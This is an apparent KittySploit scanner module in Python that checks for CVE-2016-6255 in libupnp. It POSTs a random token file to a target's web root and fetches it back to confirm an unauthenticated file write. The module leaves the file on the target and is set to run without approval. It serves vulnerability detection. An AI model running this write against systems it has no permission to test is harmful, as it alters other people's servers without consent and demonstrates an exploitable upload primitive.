#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""libupnp unauthenticated POST write (CVE-2016-6255)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'libupnp - Unauth POST Write Detection (CVE-2016-6255)',
        'description': (
            'Detects CVE-2016-6255 by POSTing a test file to the web root and retrieving it.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2016', 'libupnp', 'upnp', 'upload', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2016-6255',
        ],
        'cve': 'CVE-2016-6255',
    }

    def run(self):
        token = 'ks_' + self.random_text(12)
        path = f'/ks_cve_2016_6255_{self.random_text(6)}.test'
        r = self.http_request(
            method='POST',
            path=path,
            data=token,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        g = self.http_request(method='GET', path=path, allow_redirects=False)
        if g and token in (g.text or ''):
            self.set_info(
                severity='critical',
                reason='libupnp unauth POST write (CVE-2016-6255)',
                path=path,
            )
            return True
        return False
